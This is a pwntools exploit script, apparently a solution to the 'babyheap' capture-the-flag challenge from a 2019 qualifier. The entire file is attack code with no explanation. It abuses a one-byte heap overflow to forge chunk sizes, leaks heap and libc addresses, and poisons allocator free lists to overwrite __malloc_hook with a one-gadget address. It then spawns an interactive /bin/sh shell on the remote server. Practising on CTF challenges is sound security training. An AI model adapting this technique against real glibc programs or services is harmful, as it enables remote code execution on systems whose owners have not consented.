from pwn import *

conn = remote("babyheap.quals2019.oooverflow.io", 5000)
#conn = process("./babyheap")

def Malloc(size, content):
	conn.recvuntil("Command:")
	conn.sendlineafter("> ", "M")
	conn.sendlineafter("> ", str(size))
	conn.recvuntil("> ")
	conn.send(content)
	
def Free(idx):
	conn.sendlineafter("> ", "F")
	conn.sendlineafter(">", str(idx))

def Show(idx):
	conn.sendlineafter("> ", "S")
	conn.sendlineafter("> ", str(idx))
	
	
for i in range(0,3):
	Malloc(0xF8, "A"+"\n")

for i in range(0,2):
	Free(str(i))
	
Malloc(0xF8, "\n")	#0
Show(0)

heap = u64(conn.recv(6).ljust(8, "\x00"))
log.info("heap : " +hex(heap))

Free(str(0))
Free(str(2))

Malloc(0xF8, "A"*(0xF8-1)+"\n")	#0
Malloc(0xF8, "B"*(0xF8-1)+"\n") #1
Malloc(0xF8, "C"*(0xF8)+"\x81\n") #2

Free(1)

Malloc(0x178, "D"*(0xF8)+"\x81\x05\n") #1
Malloc(0x178, "E"*(0xF8)+"\n")	#3
Malloc(0x178, "F"*(0xF8)+"\n")	#4
Malloc(0x178, "G"*0x177+"\n")	#5
Malloc(0x178, "H"*0x177+"\n")	#6

Free(0)
Malloc(0xF8, "\n")	#0

Malloc(0xF8, "\n") #7	
Malloc(0xF8, "\n") #8
Malloc(0xF8, "\n") #9

#leak
Show(3)

main_arena = u64(conn.recv(6).ljust(8, "\x00"))-96
base_addr = main_arena-0x1e4c40
#base_addr = main_arena-0x3ebc40 #local

log.info("main_arena : " + hex(main_arena))
log.info("base_addr : " + hex(base_addr))
#context.log_level = 'debug'

Free(9)
Free(8)
Free(7)
Free(6)


#Free(0)
#Free(7)
#Free(1)

#Malloc(0x178, "I"*0x177+"\x81"+"\n")	#6

Malloc(0xF8, "0"*0xF7+"\n") #6
Malloc(0xF8, "1"*0xF7+"\n") #7
Malloc(0xF8, "2"*0xF7+"\n") #8

Free(2)
Free(7)

#make fake linked
Free(0)
Malloc(0xF8, "3"*0xF8+"\x81\n") #0

"""
one_shot = base_addr + 0x10a38c # 0x4f322 0x10a38c
system = base_addr+0x4f440
free_hook = base_addr+0x3ed8e8
malloc_hook = base_addr+0x3ebc30
""" 
one_shot = base_addr + 0xe2383 # 0xe237f 0xe2383 0xe2386 0x106ef8
free_hook = base_addr+0x1e75a8
malloc_hook = base_addr+0x1e4c30


Free(6)
Malloc(0x178, "4"*0xF8+"A"*8+p64(malloc_hook)[:-2]+"\n") #6

Malloc(0xF8, "0"*0xF7+"\n") #6
Malloc(0xF8, p64(one_shot)[:-2]+"\n") #6

conn.sendlineafter("> ", "M")
conn.sendlineafter("> ", str(10))
conn.sendline("/bin/sh")

conn.interactive()




